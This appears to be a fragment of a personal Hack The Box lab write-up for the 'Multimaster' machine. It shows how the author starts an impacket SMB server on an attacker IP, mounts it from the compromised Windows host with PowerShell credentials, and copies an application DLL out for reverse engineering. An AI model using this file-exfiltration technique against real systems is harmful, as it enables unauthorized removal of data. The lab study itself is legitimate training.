
![[Pasted image 20240927040947.png]]

Let's copy the .dll and do some reverse engineering.


So to copy the file let's fire up a SMB share and copy the .dll their
```
impacket-smbserver Hackthebox $(pwd) -smb2support -user testing -password testing
```

Get a NEW PS-Drive 
So to do that we have to put the user and password in Credential Object.
```
$pass = convertto-securestring 'testing' -AsPlainText -Force 
```

```
$cred= New-Object System.Management.Automation.PSCredential('testing', $pass)
```

```
New-PSDrive -Name testing -PSProvider FileSystem -Credential $cred -Root \\10.10.16.6\Hackthebox
```

![[Pasted image 20240927042918.png]]


```
Copy-Item "C:\inetpub\wwwroot\bin\MultimasterAPI.dll" -Destination "testing"
```


```
copy C:\inetpub\wwwroot\bin\MultimasterAPI.dll testing
```


```
Copy-Item "C:\inetpub\wwwroot\bin\MultimasterAPI.dll" -Destination "C:\Users\alcibiades\Documents"
```